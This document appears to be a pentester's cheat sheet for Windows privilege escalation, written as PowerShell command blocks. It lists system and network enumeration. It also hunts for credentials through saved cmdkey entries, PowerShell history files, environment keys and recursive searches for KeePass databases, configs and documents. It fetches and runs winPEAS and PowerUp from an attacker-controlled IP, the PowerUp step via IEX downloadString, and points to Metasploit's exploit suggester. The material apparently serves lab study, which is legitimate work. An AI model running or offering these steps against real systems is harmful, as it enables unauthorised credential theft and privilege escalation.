
> [!NOTE] Note
> set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```powershell
whoami /all

cmdkey /list

systeminfo

net user
net user <current user>
net localgroup

Get-History

(Get-PSReadlineOption).HistorySavePath
type <previous command output>
ls C:\Users\bob\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\

ipconfig /all
netstat -ano
route print

dir C:\
dir "C:\Program Files"
dir "C:\Program Files (x86)"

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls <service binary path>

$env:AppKey

gci -Path C:\ -Include *.kdbx,.git -File -Recurse -ErrorAction SilentlyContinue
gci -Path C:\xampp -Include *.txt,*.ini,*.yml -File -Recurse -ErrorAction SilentlyContinue
gci -Path C:\Users\ -Include *.exe,*.txt,*.rdp,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx,*.ps1,*.bat,*.ini,*.yml -File -Recurse -ErrorAction SilentlyContinue
gci -h -Path C:\Users\ -Include *.exe,*.txt,*.rdp,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx,*.ps1,*.bat,*.ini,*.yml -File -Recurse -ErrorAction SilentlyContinue
gci C:\Users\Public

where.exe /R C:\Windows bash.exe
where.exe /R C:\Windows wsl.exe
```
1.  Snoop on processes
```powershell
Import-Module .\Watch-Command.ps1
Get-Process | watch-command -diff -cont -verbose -property "Image Name"
```
2. Run PEAS,
```powershell
curl 192.168.45.x/winPEAS.exe -o winpeas.exe
.\winpeas.exe
```
3. PowerUp
```powershell
IEX(New-Object Net.WebClient).downloadString('http://192.168.45.x/PowerUp.ps1');Invoke-Allchecks
```
4. Running the `sysinfo` command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester
```
post/multi/recon/local_exploit_suggester
```